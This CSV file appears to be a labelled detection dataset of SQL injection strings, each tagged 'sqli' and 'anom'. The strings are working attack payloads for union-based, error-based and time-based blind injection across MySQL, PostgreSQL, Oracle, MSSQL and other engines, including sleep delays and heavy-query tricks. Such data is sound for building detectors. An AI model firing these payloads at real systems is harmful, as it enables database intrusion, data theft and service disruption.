Query,Length,Attack,Label
"1'+(select 'ixza' where 4374=4374 union all select null,null,null--",67,sqli,anom
"1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"-3347'+(select xuzs where 1076=1076 union all select 1076,1076,1076,1076,1076--",79,sqli,anom
1'+(select qsmo where 3172=3172;select (case when (4780=4432) then 4780 else 4780*(select 4780 from mysql.db) end)#,115,sqli,anom
"-5082)) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",75,sqli,anom
"1' in boolean mode) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)#",150,sqli,anom
"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""hybu"" like ""hybu",228,sqli,anom
"1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,sqli,anom
"1';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",87,sqli,anom
"-7518"" or elt(8413=3995,3995) and ""cpnf""=""cpnf",46,sqli,anom
"-9175')) union all select 6174,6174,6174,6174--",47,sqli,anom
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'lwir' like 'lwir",130,sqli,anom
1'+(select ijoh where 7145=7145 order by 1--,44,sqli,anom
1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,138,sqli,anom
"1)))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((3023=3023",207,sqli,anom
-9389') or 8859=3989--,22,sqli,anom
1'||(select 'bezt' where 7876=7876;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,118,sqli,anom
1)) or sleep(5)#,16,sqli,anom
1')) as rxxd where 5049=5049;select pg_sleep(5)--,49,sqli,anom
-6081 where 3681=3681 or 2603=3138--,36,sqli,anom
1 where 4785=4785 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,222,sqli,anom
"1"") where 1212=1212 and 8475=5864",33,sqli,anom
"1"" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--",60,sqli,anom
"1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (1624=1624",107,sqli,anom
1;select (case when (7254=5901) then 1 else 7254*(select 7254 from master..sysdatabases) end)--,95,sqli,anom
"-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#",84,sqli,anom
"-6928"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""mxhr"" like ""mxhr",218,sqli,anom
1')) and sleep(5) and (('tcwt'='tcwt,36,sqli,anom
1') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes,63,sqli,anom
"1) as nmlm where 9872=9872;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",87,sqli,anom
"1' where 6902=6902 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",216,sqli,anom
"1) and elt(7425=8842,8842) and (9194=9194",41,sqli,anom
"1%')) union all select null,null,null,null,null,null,null--",59,sqli,anom
1') rlike (select (case when (7447=3981) then 1 else 0x28 end)),63,sqli,anom
"1%"") rlike (select * from (select(sleep(5)))sgvo) and (""%""=""",60,sqli,anom
"-3865') union all select 4935,4935,4935,4935,4935--",51,sqli,anom
"1"")) waitfor delay '0:0:5' and ((""witb""=""witb",45,sqli,anom
"1%') union all select null,null,null#",37,sqli,anom
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",92,sqli,anom
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""ymss""=""ymss",111,sqli,anom
1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--,59,sqli,anom
"-5761"") or 3762=1274",20,sqli,anom
"1) where 9829=9829 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",156,sqli,anom
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",71,sqli,anom
1')) rlike (select * from (select(sleep(5)))sgvo) and (('hqcz'='hqcz,68,sqli,anom
"1""))) and 2006=2006",19,sqli,anom
"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#",102,sqli,anom
"1%"" union all select null#",26,sqli,anom
1) where 8320=8320 waitfor delay '0:0:5'--,42,sqli,anom
"1' in boolean mode) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",157,sqli,anom
-3520%' or 8571=8571--,22,sqli,anom
"1"")) as femc where 1313=1313 and 4595=4595#",43,sqli,anom
"-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj",53,sqli,anom
"1) where 8302=8302 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",94,sqli,anom
"1%')) union all select null,null,null,null,null,null,null,null--",64,sqli,anom
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""fkmh""=""fkmh",66,sqli,anom
"1');iif(1157=4542,1,1/0)",24,sqli,anom
"1"" order by 1#",14,sqli,anom
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ymnm'='ymnm,218,sqli,anom
"1"")) as rcse where 4559=4559 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",120,sqli,anom
"1"") as sstd where 9629=9629 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",120,sqli,anom
-1432 order by 1#,17,sqli,anom
-9721') or 9287=4362#,21,sqli,anom
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'bpbe' like 'bpbe",163,sqli,anom
1) where 2734=2734 waitfor delay '0:0:5'--,42,sqli,anom
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('narn'='narn",175,sqli,anom
"1'))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,sqli,anom
-2793') where 2621=2621 union all select 2621#,46,sqli,anom
"1)) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((3003=3003",169,sqli,anom
"1)) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((5200=5200",170,sqli,anom
-5585%'))) or 6990=7727,23,sqli,anom
"1"" and 6637=2321",16,sqli,anom
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",61,sqli,anom
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621",121,sqli,anom
"1)) as hqwy where 4433=4433 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",131,sqli,anom
1'||(select 'mlwj' from dual where 4247=4247 and 1702=8469)||',62,sqli,anom
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",85,sqli,anom
1');(select * from (select(sleep(5)))srmq) and ('pgth'='pgth,60,sqli,anom
"1 where 4331=4331 union all select null,null,null,null,null,null#",65,sqli,anom
"1"" where 1809=1809 and make_set(8403=8403,8899)--",49,sqli,anom
"1)) as npdl where 5796=5796 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,sqli,anom
"1'))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",101,sqli,anom
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",109,sqli,anom
1 where 5700=5700;select pg_sleep(5)--,38,sqli,anom
"-8777"") as lalf where 8606=8606 or elt(4397=5823,5823)--",56,sqli,anom
"1"") where 9962=9962 and 4595=4595#",34,sqli,anom
"1'+(select qdon where 9453=9453;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",133,sqli,anom
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('bzgs' like 'bzgs",181,sqli,anom
1)) as pynj where 7683=7683 waitfor delay '0:0:5'--,51,sqli,anom
"-9937')) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",71,sqli,anom
"1"")) as itxo where 7916=7916;select count(*) from generate_series(1,5000000)--",78,sqli,anom
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",161,sqli,anom
"1'+(select iaeu where 5509=5509 or 8514=benchmark(5000000,md5(0x544d5a4c))#",75,sqli,anom
"-6084')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('dfcp'='dfcp",222,sqli,anom
1')) or (select * from (select(sleep(5)))ydpu) and (('yqbo'='yqbo,65,sqli,anom
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)-- yekf",114,sqli,anom
"-4166%"") union all select 5190--",32,sqli,anom
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz",162,sqli,anom
"-4072%""))) or 3999=1979",23,sqli,anom
"-1763%"" or (8459=8459)*4906 and ""%""=""",37,sqli,anom
"1') as siyk where 1514=1514 union all select null,null,null,null,null,null#",75,sqli,anom
"1%"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""%""=""",85,sqli,anom
"1',row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",200,sqli,anom
1'||(select 'owzs' where 1475=1475 union all select null--,58,sqli,anom
"1'||(select 'akye' where 9242=9242 union all select null,null,null,null,null,null#",82,sqli,anom
"1) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",78,sqli,anom
"1"") where 3321=3321;begin dbms_lock.sleep(5); end--",51,sqli,anom
"-6996%"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli,anom
1))) and 6969=(select 6969 from pg_sleep(5)) and (((5333=5333,61,sqli,anom
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),189,sqli,anom
"1"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""diiv""=""diiv",96,sqli,anom
"1"")) as xhat where 6674=6674 union all select null,null,null#",61,sqli,anom
"1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",133,sqli,anom
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",61,sqli,anom
"1%') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli,anom
"1' where 8430=8430 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,sqli,anom
"1' where 2774=2774 union all select null,null,null,null,null#",61,sqli,anom
"1%') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('%'='",119,sqli,anom
"1 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",109,sqli,anom
"1')) as bsvk where 5985=5985 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",120,sqli,anom
"-9837"" where 7201=7201 union all select 7201,7201,7201--",56,sqli,anom
"1'||(select 'scqw' where 3337=3337 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",110,sqli,anom
"1%"");select sleep(5) and (""%""=""",31,sqli,anom
1' and 7528=2894 and 'qoyw'='qoyw,33,sqli,anom
"1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",150,sqli,anom
"-6890""))) union all select 1115#",32,sqli,anom
1));waitfor delay '0:0:5'--,27,sqli,anom
"-7111 union all select 2409,2409,2409,2409,2409,2409#",53,sqli,anom
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""soyg""=""soyg",109,sqli,anom
"1') as pghp where 9086=9086;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",112,sqli,anom
1') where 2330=2330 and (select * from (select(sleep(5)))fzno)--,64,sqli,anom
"1'+(select acax where 4169=4169 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",130,sqli,anom
1)) and 2006=2006,17,sqli,anom
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'gajm'='gajm",134,sqli,anom
1' where 6116=6116;select (case when (7033=1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#,127,sqli,anom
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",93,sqli,anom
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#",90,sqli,anom
"1')) as jntr where 5051=5051 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",201,sqli,anom
"1) where 1193=1193 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",110,sqli,anom
"1"")) as xwrq where 4161=4161;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",120,sqli,anom
"1%"") and elt(4249=4249,7259) and (""%""=""",39,sqli,anom
"1') and elt(3114=3114,sleep(5))#",32,sqli,anom
1%') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('%'=',75,sqli,anom
"1"") as fgne where 7207=7207;select pg_sleep(5)--",48,sqli,anom
1' and 6969=(select 6969 from pg_sleep(5)) and 'dgvg'='dgvg,59,sqli,anom
"1) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (8450=8450",173,sqli,anom
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""okpa""=""okpa",109,sqli,anom
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fjwv"" like ""fjwv",211,sqli,anom
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""ctrr""=""ctrr",79,sqli,anom
1') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd,81,sqli,anom
"1"")) as ikuz where 7385=7385;select sleep(5)#",45,sqli,anom
"1' in boolean mode);select benchmark(5000000,md5(0x4c4d6142))#",62,sqli,anom
"1'+(select 'rpbx' where 6748=6748 and elt(4249=4249,7259))+'",60,sqli,anom
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('jwbt'='jwbt",127,sqli,anom
"1'+(select qjng where 1897=1897 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",140,sqli,anom
"1 where 2267=2267 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",94,sqli,anom
"1%"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""%""=""",101,sqli,anom
"1"";iif(5257=5257,1,1/0)",23,sqli,anom
1'||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||',59,sqli,anom
"-5109))) or make_set(6627=7331,7331) and (((9466=9466",53,sqli,anom
"1))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((7589=7589",176,sqli,anom
"-9514)) as xdkw where 4975=4975 union all select 4975,4975,4975,4975#",69,sqli,anom
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""jgcv""=""jgcv",222,sqli,anom
"1'+(select dagm where 5461=5461 or 8466=benchmark(5000000,md5(0x694a4745)))+'",77,sqli,anom
1')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)#,89,sqli,anom
1%' rlike (select (case when (3596=4245) then 1 else 0x28 end)) and '%'=',73,sqli,anom
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",216,sqli,anom
"-2086%'))) or make_set(9354=9354,7185) and ((('%'='",51,sqli,anom
1));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,101,sqli,anom
"-5700 where 4238=4238 union all select 4238,4238,4238#",54,sqli,anom
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('vjhw' like 'vjhw",130,sqli,anom
1')) and 3526=1354,18,sqli,anom
"1"") where 3445=3445 and elt(1212=1254,1254)--",45,sqli,anom
"1%')) union all select null,null,null,null,null,null,null,null,null,null--",74,sqli,anom
"1' in boolean mode) and elt(3114=3114,sleep(5))#",48,sqli,anom
1'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,69,sqli,anom
"-1504"") as wpes where 6256=6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",99,sqli,anom
"1) as agex where 8167=8167 and 3824=benchmark(5000000,md5(0x76555642))--",72,sqli,anom
"1'+(select dnxi where 5850=5850 or 8156=(select count(*) from generate_series(1,5000000))--",91,sqli,anom
1'+(select mavu where 4276=4276 rlike sleep(5)#,47,sqli,anom
"1%""))) and make_set(8191=7813,7813) and (((""%""=""",48,sqli,anom
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv",50,sqli,anom
"-7887') union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",75,sqli,anom
1'))) and 4069=8786 and ((('eftr'='eftr,39,sqli,anom
"1"";begin dbms_lock.sleep(5); end and ""xouo"" like ""xouo",54,sqli,anom
